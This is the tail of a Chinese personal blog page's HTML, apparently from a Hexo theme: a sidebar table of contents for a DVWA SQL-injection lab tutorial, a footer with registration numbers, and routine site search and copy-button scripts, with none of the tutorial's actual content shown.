+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LoongEyes</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">81</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入简介"><span class="nav-number">1.</span> <span class="nav-text">SQL注入简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#手工注入思路"><span class="nav-number">2.</span> <span class="nav-text">手工注入思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LOW级别漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">LOW级别漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否存在注入，注入是字符型还是数字型"><span class="nav-number">3.1.</span> <span class="nav-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猜解SQL查询语句中的字段数"><span class="nav-number">3.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取当前数据库"><span class="nav-number">3.3.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取dvwa数据库中的表"><span class="nav-number">3.4.</span> <span class="nav-text">获取dvwa数据库中的表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取dvwa库users表中的列名"><span class="nav-number">3.5.</span> <span class="nav-text">获取dvwa库users表中的列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据记录"><span class="nav-number">3.6.</span> <span class="nav-text">获取数据记录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Medium级别漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">Medium级别漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否存在注入，注入是字符型还是数字型-1"><span class="nav-number">4.1.</span> <span class="nav-text">判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猜解SQL查询语句中的字段数-1"><span class="nav-number">4.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取当前数据库-1"><span class="nav-number">4.3.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取dvwa数据库中的表-1"><span class="nav-number">4.4.</span> <span class="nav-text">获取dvwa数据库中的表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取dvwa库users表中的列名-1"><span class="nav-number">4.5.</span> <span class="nav-text">获取dvwa库users表中的列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据记录-1"><span class="nav-number">4.6.</span> <span class="nav-text">获取数据记录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#High级别漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">High级别漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断是否存在注入，注入是字符型还是数字型-2"><span class="nav-number">5.1.</span> <span class="nav-text">判断是否存在注入，注入是字符型还是数字型</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Impossible级别"><span class="nav-number">6.</span> <span class="nav-text">Impossible级别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入防御"><span class="nav-number">7.</span> <span class="nav-text">SQL注入防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLMAP"><span class="nav-number">8.</span> <span class="nav-text">SQLMAP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆数据库"><span class="nav-number">8.1.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆表"><span class="nav-number">8.2.</span> <span class="nav-text">爆表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆字段"><span class="nav-number">8.3.</span> <span class="nav-text">爆字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆数据"><span class="nav-number">8.4.</span> <span class="nav-text">爆数据</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LoongEyes</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共160.9k字</span>
+</div>
+
+
+<div style="width:400px;margin:0 auto; padding:20px 0;">
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/images/beiantubiao.png" alt="备案标识"/></div>
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=37010302000766" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁公网安备 37010302000766号</p></a>
+	<div style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">鲁ICP备19025353号</p></div>
+</div>
+ 
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
